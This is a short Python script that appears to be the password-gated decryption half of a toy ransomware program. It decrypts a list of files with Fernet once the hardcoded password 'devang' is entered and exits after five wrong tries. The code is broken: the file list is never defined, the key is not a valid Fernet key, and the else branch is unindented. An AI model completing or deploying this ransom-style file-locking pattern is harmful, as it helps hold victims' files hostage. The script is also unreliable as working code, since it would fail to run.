
import os
from cryptography.fernet import Fernet

key = bytes(b'Devang')


def dec():
    for file in files:
        with open(file,"rb") as thefile:
            contents = thefile.read()
        contents_dec = Fernet(key).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_dec)
            

print("Enter Correct Password to decrypt:")

inc_cnt = 0
password = input()

def passw(passg,inc_cnt1):
    if inc_cnt1 == 5:
        exit()
    if passg == "devang":
        dec()
        print("Congrats All your files have been decrypted")
    else:
    inc_cnt1 += 1
    print("Wrong attempt number:"+str(inc_cnt1)+". Enter Correct password:\n")
    helm = input()
    passw(helm,inc_cnt1)
       
passw(password,inc_cnt)
